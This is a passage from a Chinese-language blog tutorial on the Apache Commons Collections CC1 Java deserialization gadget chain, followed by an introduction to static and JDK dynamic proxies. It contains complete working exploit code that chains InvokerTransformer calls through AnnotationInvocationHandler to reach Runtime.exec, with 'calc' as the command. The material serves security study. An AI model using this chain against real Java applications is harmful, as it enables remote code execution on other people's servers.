的输入对象是什么，它都会忽略输入，始终返回构造时指定的常量值。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111445636.png" alt="img"></p><p>根据以上两个类的功能，我们可以使<code>setValues</code>传入任何参数时，最后调用<code>transform</code>时传入的参数均为<code>Runtime.class</code>，具体实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.CC1_Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/25 15:28</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(r),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-type">byte</span>[] ser = ser(annotationInvocationHandler);<br>        deser(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();   <span class="hljs-comment">//定义字节数组输出流</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);  <span class="hljs-comment">//定义输出流</span><br>        oos.writeObject(o); <span class="hljs-comment">//序列化对象</span><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);  <span class="hljs-comment">//读取执行字节数组作为输入流</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    <span class="hljs-comment">//将字节输入流作为输入流</span><br>        <span class="hljs-keyword">return</span> ois.readObject();    <span class="hljs-comment">//反序列化读取对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111441332.png" alt="img"></p><p>通过下断点一步步跟踪最后可以发现确实如之前预料的一样，最后的参数修改成为<code>Runtime.class</code>，达到修改参数的目的，但是继续运行会发现仍然产生异常；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111444028.png"></p><p>发现在序列化的过程中产生了异常，这个问题的来源是因为<code>Runtime</code>没有实现<code>serializable</code>不能进行序列化；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408130049886.png" alt="img"></p><p>这时想到ChainedTransform的链式执行以及之前利用过<code>InvokerTransformer</code>进行反射调用任意类的函数，那么可以结合ChainedTransformer和InvokerTransformer，多执行几次transform函数，实现通过单例模式反射调用exec函数；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntime</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) getRuntime.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>exec.invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><p>先熟悉以下上述的反射调用exec函数的代码，我们在修改成<code>InvokerTransformer</code>调用即可；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = &#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure><p>最后得到我们完整的反序列化利用链代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.candy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> candy</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> Deserializatioin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.candy.exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/10/25 15:48</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        Class&lt;?&gt; annotationInvocationhandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationhandlerconstructor = annotationInvocationhandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationhandlerconstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">annotationInvocationHandler</span> <span class="hljs-operator">=</span> annotationInvocationhandlerconstructor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-type">byte</span>[] ser = ser(annotationInvocationHandler);<br><br>        deser(ser);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] ser(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();   <span class="hljs-comment">//定义字节数组输出流</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);  <span class="hljs-comment">//定义输出流</span><br>        oos.writeObject(o); <span class="hljs-comment">//序列化对象</span><br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deser</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] ser)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(ser);  <span class="hljs-comment">//读取执行字节数组作为输入流</span><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);    <span class="hljs-comment">//将字节输入流作为输入流</span><br>        <span class="hljs-keyword">return</span> ois.readObject();    <span class="hljs-comment">//反序列化读取对象</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>根据最后的利用链代码得出以下的流程图；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111445108.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">MapEntry.setValue()</span><br><span class="hljs-comment">TransformedMap.checkSetValue()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br><span class="hljs-comment">ConstantTransformer.transform()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Class.getMethod()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.getRuntime()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h1 id="四、动态代理"><a href="#四、动态代理" class="headerlink" title="四、动态代理"></a>四、动态代理</h1><p>这里先说说为啥要讲讲这个动态代理，首先是有一些反序列化链子中会涉及到这个知识点，如果不会到时候分析就会看得一脸懵，不知道为啥就会调用了；第二就是我们接下来分析yso的CC1链子中就利用了动态代理。</p><h2 id="4-1-代理模式"><a href="#4-1-代理模式" class="headerlink" title="4.1 代理模式"></a>4.1 代理模式</h2><p>代理模式是一种比较好理解的设计模式。简单来说就是 <strong>我们使用代理对象来代替对真实对象(real object)的访问，这样就可以在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能。</strong></p><p><strong>代理模式的主要作用是扩展目标对象的功能，比如说在目标对象的某个方法执行前后你可以增加一些自定义的操作。</strong></p><p>代理模式有静态代理和动态代理两种实现方式，我们依次尝试静态代理和动态代理的实现。</p><h2 id="4-2-静态代理"><a href="#4-2-静态代理" class="headerlink" title="4.2 静态代理"></a>4.2 静态代理</h2><p><strong>静态代理中，我们对目标对象的每个方法的增强都是手动完成的（</strong><em><strong>后面会具体演示代码</strong></em><strong>），非常不灵活（</strong><em><strong>比如接口一旦新增加方法，目标对象和代理对象都要进行修改</strong></em><strong>）且麻烦(<em><strong><strong>需要对每个目标类都单独写一个代理类</strong></strong></em>）。</strong> 实际应用场景非常非常少，日常开发几乎看不到使用静态代理的场景。</p><p>上面我们是从实现和应用角度来说的静态代理，从 JVM 层面来说， <strong>静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件。</strong></p><p>静态代理实现步骤:</p><ol><li>定义一个接口及其实现类；</li><li>创建一个代理类同样实现这个接口</li><li>将目标对象注入进代理类，然后在代理类的对应方法调用目标类中的对应方法。这样的话，我们就可以通过代理类屏蔽对目标对象的访问，并且可以在目标方法执行前后做一些自己想做的事情。</li></ol><p>下面通过代码展示！</p><ol><li>定义发送短信的接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SmsService</span> &#123;<br>    String <span class="hljs-title function_">send</span><span class="hljs-params">(String message)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>实现发送短信的接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SmsService</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">(String message)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;send message:&quot;</span> + message);<br>        <span class="hljs-keyword">return</span> message;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>创建代理类并同样实现发送短信的接口</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">SmsService</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> SmsService smsService;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsProxy</span><span class="hljs-params">(SmsService smsService)</span> &#123;<br>        <span class="hljs-built_in">this</span>.smsService = smsService;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">(String message)</span> &#123;<br>        <span class="hljs-comment">//调用方法之前，我们可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;before method send()&quot;</span>);<br>        smsService.send(message);<br>        <span class="hljs-comment">//调用方法之后，我们同样可以添加自己的操作</span><br>        System.out.println(<span class="hljs-string">&quot;after method send()&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ol><li>实际使用</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">staticProxy</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">SmsService</span> <span class="hljs-variable">smsService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsServiceImpl</span>();<br>        <span class="hljs-type">SmsProxy</span> <span class="hljs-variable">smsProxy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmsProxy</span>(smsService);<br>        smsProxy.send(<span class="hljs-string">&quot;Java is the best language!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行上述代码之后，控制台打印出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">before method send()<br>send message:Java is the best language!<br>after method send()<br></code></pre></td></tr></table></figure><p>可以输出结果看出，我们已经增加了 <code>SmsServiceImpl</code> 的<code>send()</code>方法。</p><h2 id="4-3-动态代理"><a href="#4-3-动态代理" class="headerlink" title="4.3 动态代理"></a>4.3 动态代理</h2><p>内容来自：<a href="https://javaguide.cn/java/basis/proxy.html">https://javaguide.cn/java/basis/proxy.html</a></p><p>相比于静态代理来说，动态代理更加灵活。我们不需要针对每个目标类都单独创建一个代理类，并且也不需要我们必须实现接口，我们可以直接代理实现类( <em>CGLIB 动态代理机制</em>)。</p><p><strong>从 JVM 角度来说，动态代理是在运行时动态生成类字节码，并加载到 JVM 中的。</strong></p><p>就 Java 来说，动态代理的实现方式有很多种，比如 <strong>JDK 动态代理</strong>、<strong>CGLIB 动态代理</strong>等等。</p><p>下面通过代码展示一下JDK动态代理的效果：</p><h3 id="4-3-1-基本类的介绍"><a href="#4-3-1-基本类的介绍" class="headerlink" title="4.3.1 基本类的介绍"></a>4.3.1 基本类的介绍</h3><p><strong>在 Java 动态代理机制中</strong> <code>**InvocationHandler**</code> <strong>接口和</strong> <code>**Proxy**</code> <strong>类是核心。</strong></p><p><code>Proxy</code> 类中使用频率最高的方法是：<code>newProxyInstance()</code> ，这个方法主要用来生成一个代理对象。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span><br><span class="hljs-params">                                      Class&lt;?&gt;[] interfaces,</span><br><span class="hljs-params">                                      InvocationHandler h)</span><br><span class="hljs-keyword">throws</span> IllegalArgumentException<br>&#123;<br>......<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法一共有 3 个参数：</p><ol><li><strong>loader</strong> :类加载器，用于加载代理对象；</li><li><strong>interfaces</strong> : 被代理类实现的一些接口；</li><li><strong>h</strong> : 实现了 <code>InvocationHandler</code> 接口的对象；</li></ol><p> 要实现动态代理的话，还必须需要实现<code>InvocationHandler</code> 来自定义处理逻辑。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现<code>InvocationHandler</code> 接口类的 <code>invoke</code> 方法来调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">InvocationHandler</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 当你使用代理对象调用方法的时候实际会调用到这个方法</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span><br>        <span class="hljs-keyword">throws</span> Throwable;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invoke()</code> 方法有下面三个参数：</p><ol><li><strong>proxy</strong> :动态生成的代理类</li><li><strong>method</strong> : 与代理类对象调用的方法相对应</li><li><strong>args</strong> : 当前 method 方法的参数</li></ol><p> 也就是说：<strong>你通过</strong><code>**Proxy**</code> <strong>类的</strong> <code>**newProxyInstance()**</code> <strong>创建的代理对象在调用方法的时候，实际会调用到实现</strong><code>**InvocationHandler**</code> <strong>接口的类的</strong> <code>**invoke()**</code><strong>方法。</strong> 你可以在 <code>invoke()</code> 方法中自定义处理逻辑，比如在方法执行前后做什么事情。</p><h3 id="4-3-2-JDK动态代理类的使用步骤"><a href="#4-3-2-JDK动态代理类的使用步骤" class="headerlink" title="4.3.2 JDK动态代理类的使用步骤"></a>4.3.2 JDK动态代理类的使用步骤</h3><ol><li>定义一个接口及其实现类；</li><li>自定义 <code>InvocationHandler</code> 并重写<code>invoke</code>方法，在 <code>invoke</code> 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li><li>通过 <code>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h)</code> 方法创建代理对象；</li></ol><h3 id="4-3-3-代码示例"><a 